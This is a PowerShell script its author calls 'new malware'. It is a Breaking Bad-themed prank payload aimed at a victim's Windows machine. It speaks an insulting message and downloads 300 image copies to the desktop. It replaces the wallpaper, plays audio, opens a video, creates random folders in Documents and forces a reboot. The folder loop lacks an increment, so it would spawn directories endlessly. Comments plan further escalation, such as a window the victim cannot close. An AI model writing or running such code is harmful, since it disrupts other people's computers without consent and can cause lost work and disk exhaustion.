#new malware Summer 2022
#might be powershell or python


Set-ExecutionPolicy "Remote Signed"

#MAJOR TO DO
#make the shell full screen no X out??

#play some sounds??
(New-Object -com SAPI.SpVoice).speak("hello you have been visited by walter white and jesse pinkman. they decided to give you some of the blue stuff. also known as breaking balware. Just relax and as jesse always says. Yeah Mr. White! Yeah Science. bitch")
start-sleep -s 3

<#
while($danger -lt 2000){
	write-host "I am the danger! -W.W. I am the danger! -W.W. I am the danger! -W.W. I am the danger! -W.W. I am the danger! -W.W." 
	write-host "******************************************************************************************************************"
	$danger++
}

#>
#after shell is done make it close out but still run
while($Gun_Walt -lt 300){
#while loop needs to be implemented 
$randonum = get-random 

Invoke-WebRequest https://nofilmschool.com/sites/default/files/styles/facebook/public/breaking_bad_pilot.jpg?itok=dyv7shZq -outfile C:\Users\$env:UserName\Desktop\WW$randonum.jpg
	$Gun_Walt++
}


#wallpaper change to image from web

Invoke-WebRequest https://getwallpapers.com/wallpaper/full/c/9/a/1430635-download-hack-sign-wallpaper-1920x1080-lockscreen.jpg -outfile C:\Users\$env:UserName\Desktop\1430365-download-hack-sign-wallpaper-1920x1080-lockscreen.jpg
function Set-Wallpaper {
	
    param (
        [string]$Path,
        [ValidateSet('Tile', 'Center', 'Stretch', 'Fill', 'Fit', 'Span')]
        [string]$Style = 'Fill'
    )

    begin {
        try {
            Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                using Microsoft.Win32;
                namespace Wallpaper
                {
                    public enum Style : int
                    {
	                    Tile, Center, Stretch, Fill, Fit, Span, NoChange
                    }

                    public class Setter
                    {
	                    public const int SetDesktopWallpaper = 20;
	                    public const int UpdateIniFile = 0x01;
	                    public const int SendWinIniChange = 0x02;
	                    [DllImport( "user32.dll", SetLastError = true, CharSet = CharSet.Auto )]
	                    private static extern int SystemParametersInfo ( int uAction, int uParam, string lpvParam, int fuWinIni );
	                    public static void SetWallpaper ( string path, Wallpaper.Style style )
                        {
		                    SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
		                    RegistryKey key = Registry.CurrentUser.OpenSubKey( "Control Panel\\Desktop", true );
		                    switch( style )
		                    {
			                    case Style.Tile :
			                    key.SetValue( @"WallpaperStyle", "0" ) ;
			                    key.SetValue( @"TileWallpaper", "1" ) ;
			                    break;
			                    case Style.Center :
			                    key.SetValue( @"WallpaperStyle", "0" ) ;
			                    key.SetValue( @"TileWallpaper", "0" ) ;
			                    break;
			                    case Style.Stretch :
			                    key.SetValue( @"WallpaperStyle", "2" ) ;
			                    key.SetValue( @"TileWallpaper", "0" ) ;
			                    break;
			                    case Style.Fill :
			                    key.SetValue( @"WallpaperStyle", "10" ) ;
			                    key.SetValue( @"TileWallpaper", "0" ) ;
			                    break;
			                    case Style.Fit :
			                    key.SetValue( @"WallpaperStyle", "6" ) ;
			                    key.SetValue( @"TileWallpaper", "0" ) ;
			                    break;
			                    case Style.Span :
			                    key.SetValue( @"WallpaperStyle", "22" ) ;
			                    key.SetValue( @"TileWallpaper", "0" ) ;
			                    break;
			                    case Style.NoChange :
			                    break;
		                    }
		                    key.Close();
	                    }
                    }
                }
"@
        } catch {}

        $StyleNum = @{
            Tile = 0
            Center = 1
            Stretch = 2
            Fill = 3
            Fit = 4
            Span = 5
        }
    }

    process {
        [Wallpaper.Setter]::SetWallpaper($Path, $StyleNum[$Style])

        start-sleep -s 2
       
        [Wallpaper.Setter]::SetWallpaper($Path, $StyleNum[$Style])
    }
}

Set-WallPaper -Path C:\Users\$env:UserName\Desktop\1430365-download-hack-sign-wallpaper-1920x1080-lockscreen.jpg -Style Fill

Invoke-WebRequest https://ia600900.us.archive.org/24/items/tvtunes_8553/Breaking%20Bad.mp3 -outfile C:\Users\$env:UserName\Desktop\bbintro.mp3

#play bb intro
start C:\Users\$env:UserName\Desktop\bbintro.mp3

start-sleep -s 25

#make it reboot whole computer or hard shutdown or even a logoff

start https://youtu.be/wMEq1mGpP5A?t=51

while($Hank_Folder -lt 1000){
#makes 1000 directories 
$dif_number = get-random

mkdir C:\Users\$env:UserName\Documents\$dif_number

}

start-sleep -s 80

shutdown /r



#potential add ons**
#get breaking bad video and play it 

#call an api https://github.com/shevabam/breaking-bad-quotes

#make it launch own webpage that I created
#neocities website

#make it reboot whole computer or hard shutdown or even a logoff

















